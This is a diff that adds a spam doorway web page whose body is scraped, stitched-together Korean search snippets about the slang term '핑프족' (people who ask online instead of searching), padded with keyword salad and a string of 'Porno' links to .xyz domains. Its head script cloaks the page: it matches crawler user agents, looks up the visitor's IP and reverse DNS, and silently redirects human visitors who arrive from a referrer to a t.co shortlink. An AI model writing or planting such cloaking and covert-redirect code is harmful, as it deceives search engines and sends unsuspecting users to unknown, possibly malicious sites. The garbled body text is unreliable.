@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>8208</title>
+</script>
+</head>
+<body>
+<h1>핑프족</h1>
+<p>Aug 13, 2018 — '핑프족'이란? 간단한 정보조차 스스로 찾아보지 않고 온라인과 SNS 등에 물어보는 사람을 뜻한다. 핑커(finger, 손가락)와 프린세스(princess, 공주) ...'핑프족'이란 핑거(finger, 손가락)와 프린세스(princess, 공주) 혹은 프린스(prince, 왕자)를 합쳐 부르는 말로, 간단한 정보조차 스스로 찾아보지 않고 온라인과 SNS ...핑프는 바로 핑거 프린스의 줄임말로, 핑프족은 핑거 프린스족을 뜻합니다. 손가락을 뜻하는 핑거와 왕자를 뜻하는 프린스의 조합! 손가락 왕자님??? 언뜻 들으면 뉘앙스를 ...Mar 20, 2019 — 핑프란, 핑거프린세스(figer priness)나 핑거 프린스(pinger prince)의 줄임말로 간단한 정보 조차 스스로 조사하는 것을 귀찮아 하여 사이트 게시판이나 ...Oct 16, 2019 — 핑프족은 간단한 정보조차 스스로 찾아보거나 떠올려보려고 노력하지 않고, 주변 사람들에게 무작정 물어보거나 인터넷 검색으로 쉽게 해결하려는 ...Aug 6, 2021 — 이렇게 사이트 이용 시 기본적인 공지조차 읽지 않거나 많은 질문과 답변이 있는데도 검색 한번 해보지 않고 무작정 묻는 사람들을 핑프라고 하며, 핑거 ...Oct 18, 2017 — 핑프족은 '핑거 프린세스(finger princess)' 또는 '핑거 프린스(finger prince)'를 일컫는 신조어로, 간단한 정보조차 스스로 찾아보거나 조사하지 않고 ...#핑프족. 173 조회 수. 아직 이 해시태그를 사용한 동영상 없음. 동영상을 찾고 계시나요? 인기 있는 크리에이터, 해시태그 및 사운드를 찾아보세요.Sep 4, 2019 — 핑프족은 '핑거 프린세스(finger princess)' 또는 '핑거 프린스(finger prince)'를 줄인 말로, 간단한 정보조차 자신이 직접 찾아보려 노력하지 않고 ...Jan 29, 2022 — 핑프족과 핑슬족이 있다. 검색은 하지 않고 질문만 하는 사람은 핑프족, 핑프족의 질문에 일일이 답변을 주는 핑슬족 이 둘의 관계가 어쩌면 공생의 ...Sep 14, 2022 — 연구실 동료가 핑프족입니다. 덕분에 행정업무 등 기타 잡일을 제가 맡고있어요. 너무 당연하고 죄책감 하나 없이 본인이 맡게 된일에 대하여 저한테 ...그러나 어느 정도 숙지하고 있어야 인생드레스를 만날 수 있는 법! 일일이 용어를 찾아보기 귀찮은 우리 핑프족 신부님들을 위해 라베스띠도, 앙겔로스가 대신 알려 ...Oct 8, 2020 — 안녕하세요! 씨웨이입니다. 다양한 온라인 채널을 통해. SNS활동을 하다보면. 처음보는 단어가 있던적있나요? 핑프, 핑프족 은 무엇을 뜻하는지.핑프족은 '핑거 프린세스(finger princess)' 또는 '핑거 프린스(finger prince)'를 줄인 말로, 간단한 정보조차 자신이 직접 찾아보려 노력하지 않고 인터넷이나 주변 ...Apr 4, 2022 — 핑거프린세스(finger princess) 혹은 핑거프린스(finger prince)의 줄임말인 핑프족은 쉬운 정보를 스스로 알아보려 하지 않고 쉽게 질문으로 해결 ...Apr 7, 2018 — ... 행동을 일컬어 '핑프족'이라고 한다. 핑프족은 '핑거 프린세스(finger princess)' 또는 '핑거 프린스(finger prince)'를 줄인 말로 간단한 정보.Nov 14, 2021 — 핑프족은 본인이 찾을 생각을 못하는건가요?, 심리, 상담 - 핑프족들 심리가 궁금합니다.검색하면 나오는걸 왜 찾지도 않고 물어보는걸까요?Feb 16, 2021 — 핑프족 아냐? 나는 이 말을 듣고 이 생소한 말에 두려웠다. 모르는 말들이 많은 시대 나 역시도 줄임말도 인터넷 용어도 잘 모르는데 핑프족 안 ...Nov 19, 2020 — 이러한 사람들을 가르켜 핑프족이라는 신조어까지 생겼다. 귀하게 자란 사람들이 이렇게 될 확률도 많다. 누군가가 내 대신 많은 일을 해주기 때문 ...서비스 기획을 위한 유저 인터뷰 | 코드스테이츠 PMB11기 W2D3 핑프가 그렇게 나빠? 핑거 프린스/프린세스. 행여 손가락이라도 닳을까 얻고 싶은 정보는 직접 찾아보는 ..."너 '핑프족'이니?" 스스로 해결하려는 의지와 올바른 정보를 습득할 수 있는 능력을 길러야 할 것입니다. #국민대학교 #사회학과 #헤르메스 #카드뉴스 #핑프족.핑프족. 4801 박남량 [narcciso] 스크랩 2019-05-17. 핑프족. 핑프는 핑거 프린세스(finger princess)나 핑거 프린스(finger prince)의 준말로 신조어다.Oct 30, 2017 — 특히 내달 치러질 2018학년도 대학수학능력시험(수능)을 앞두고, 요즘 많은 온라인 대입 커뮤니티가 '핑프족' 때문에 골머리를 앓는다. 검색만 하면 ...Jan 7, 2019 — 핑프족은 암기교육의 산물일까. 핑프족은 핑거(finger Princess) 혹은 핑거 프린스(prince)의 약자어이다. 손가락 공주, 손가락 왕자라는 뜻을 가진 ...Apr 30, 2023 — 정말 핑프라고 욕먹을 정도라면 핵심 키워드만 검색 한번 눌러봐도 앞서 다른 사람이 했던 질문이나 다른 사람이 썼던 공략에 깔끔하게 정리되어있는 ...Feb 2, 2019 — 설 연휴가 시작됐습니다. 다들 고향길 떠나셨나요? 안전운전 하시면서 심심라디오도 함께 즐겨 보시는 건 어떠신가요? 이번 주 상식은 '핑프족'입니다 ...Dec 4, 2018 — [오디오래빗] '핑프족' G20 궁금해도 검색은 귀찮아 :) 미니경제용어, ♪ 이어폰을 귀에 꽂으세요 !.!Sep 10, 2018 — 따라서 사람들은 각자 각종 데이터와 정보를 구하고 분석하려고 많이 노력합니다. 하지만 최근 남에게 의존해서 데이터를 얻는 '핑프족'이 등장했습니다.48 minutes ago — 메린이 메린이 하는놈들은 죄다 핑프족인데. 단어를 못쓰게 막아버리면안되냐? 메1린이 리1린이 이지랄하진 않을거고. 추천검색. 개념글 추천하기.15 hours ago — 핑프족절단기 19 분 전. ㄱㄹㅂ. [레벨:30] 오른손수면제 19 분 전. ㄱㄼ. [레벨:5] 프호돈예비번호1 19 분 전. ㅂㅇㅈ. [레벨:1] 홍단청단 16 분 전.19 hours ago — 댓글 1 개. [레벨:3] 핑프족절단기 48 분 전.이렇게 핑프뜻을 알아봤습니다. 요즘 핑프족이라는 단어를 많이 사용하더라구요~. 이것은 온라인 개학 혹은 개강에만 국한되는 것이 아니라 다양한 SNS 플랫폼에서 ...핑 프족. 해석하면 손가락 왕자/공주 인데요. 우리는 비슷한 생활 환경을 가지고 있고 동일한 상황에 대해 궁금해 ...핑 프족 [17ef]. 여러분도 혹시 누군가 해주길 기다리시지 말고. 마치 공주나 왕자처럼 가만히 앉아 쉽게 지식 ...6 days ago — 핑프뜻(125, 2020신조어 핑프뜻 을 알아보자 핑프족은 무엇일까 - 블로그 핑프뜻, 대체 핑프란 무엇인가? - 보통스러운 이야기 - 티스토리 기타 유입 ...15 hours ago — 2022 — 텔레그램에서 '핑프방 Files'와 '텔레그램 입시평가연구소 시즌2'를 ... 입장법과 핑프방 처벌 주의점 정리 | 핑프 뜻, 핑프족 설명 핑프방, ...2 days ago — 핑프족 공주나 왕자처럼 손가락만 까닥거리며 남을 시킨다는 의미로 핑거 프린세스Finger Princess 또는 핑거 프린스Finger Prince를 줄인 말이다. 도라지 ...내비게이션 네비게이션Brian de palma 청포도 시 핑 프족.Hoku meaning핑 프족 켄호 로우 은방울꽃 독성.미국 국토 안보부은방울꽃 독성 아이클라우드 카카오톡 복원 ...핑 프족 - 핑 프족. 가연아이앤씨. 뒹굴 뒹굴 - 뒹굴 뒹굴. 스프링 소리 없는 키보드. 디시인사이드 교대 갤러리. Clamp 종류. 3세대 인권. 홍옥 묘목.18 hours ago — 핑 i525 아이언 7개세트 단조 2022년 삼양인터내셔날 · 3. 핑 G425 크로스오버 드라이빙아이언 …acum 9 ore — 핑프족절단기 55 분 전. 앱이나 홈페이지, ...압력 용기 안전 검사Circus 동물 동화 핑 프족. 데샹チヒョヌ 現在 아씨 tv カトク キャラクター.천안시 축구단カトク キャラクター G 마켓 글로벌 이세이.... 뜻 - 야훼 뜻 핑프족 뜻 진우기획 커피 프리마 성분 Ive 新曲 歌词 쿠팡 카카오 페이 - 쿠팡 카카오 페이 정부는 도망친다 웹툰 徳寿 新橋 오키 긴 오메가 장구균 ...압력 용기 안전 검사Circus 동물 동화 핑 프족. 데샹チヒョヌ 現在 아씨 tv カトク キャラクター.천안시 축구단カトク キャラクター G 마켓 글로벌 이세이.55 minutes ago — 압력 용기 안전 검사Circus 동물 동화 핑 프족. 데샹チヒョヌ 現在 아씨 tv カトク キャラクター.천안시 축구단カトク キャラクター G 마켓 글로벌 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
